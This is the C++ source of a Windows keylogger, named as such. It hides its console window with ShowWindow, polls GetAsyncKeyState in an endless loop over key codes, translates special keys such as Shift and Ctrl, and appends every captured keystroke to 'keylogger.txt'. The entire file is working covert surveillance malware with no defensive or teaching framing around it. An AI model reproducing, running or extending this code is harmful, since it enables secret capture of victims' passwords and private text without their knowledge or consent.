#include <iostream>
#include <fstream>
#include <windows.h>
#include <bits/stdc++.h>

// log file path
#define LOG_FILE "keylogger.txt"

// save data into log file
void saveData(std::string data)
{
    std::fstream logFile;

    // open file
    //  std::ios::app will make the new data append to the file instead fo erase file content
    //  and then write to it
    logFile.open(LOG_FILE, std::ios::app);

    // write data into log file
    logFile << data;

    // close the file stream
    logFile.close();
}

// Translate special key int into string
std::string translateSpecialKey(int key)
{
    std::string result;

    switch (key)
    {
    case VK_SPACE:
        result = " ";
        break;

    case VK_RETURN:
        result = "\n";
        break;

    case VK_BACK:
        result = "\b";
        break;

    case VK_CAPITAL:
        result = "[CAPS_LOCK]";
        break;

    case VK_SHIFT:
        result = "[SHIFT]";
        break;

    case VK_CONTROL:
        result = "[CTRL]";
        break;

    case VK_MENU:
        result = "[ALT]";
        break;

    case VK_TAB:
        result = "[TAB]";
        break;

    default:
        break;
    }
    return result;
}

int main()
{

    int specialKeyArray[] = {
        VK_SPACE,
        VK_RETURN,
        VK_SHIFT,
        VK_BACK,
        VK_TAB,
        VK_CONTROL,
        VK_MENU,
        VK_CAPITAL,
    };
    std::string specialKeyChar;
    bool isSpecialKey;

    // hide terminal window
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    // loop forever
    while (true)
    {
        // loop through each key
        for (int key = 8; key <= 190; key++)
        {
            // check key is pressed
            if (GetAsyncKeyState(key) == -32767)
            {
                // key is pressed
                //  check if key is specialkey
                isSpecialKey = std::find(std::begin(specialKeyArray), std::end(specialKeyArray),key)!= std::end(specialKeyArray);
                if(isSpecialKey){
                    //this is a special key, we need to translate it
                    specialKeyChar = translateSpecialKey(key);
                    //save data
                    saveData(specialKeyChar);
                }else{
                    //this is not a special key. we need to check if it is uppercase or lowecase
                    if(GetKeyState(VK_CAPITAL)){
                        //capslock is on
                        saveData(std::string(1,(char)key));                    
                    }else{
                        //capslock is off
                        // turn the character into lowercase before save
                        saveData(std::string(1,(char)std::tolower(key)));
                    }
                }
            }
        }
    }
}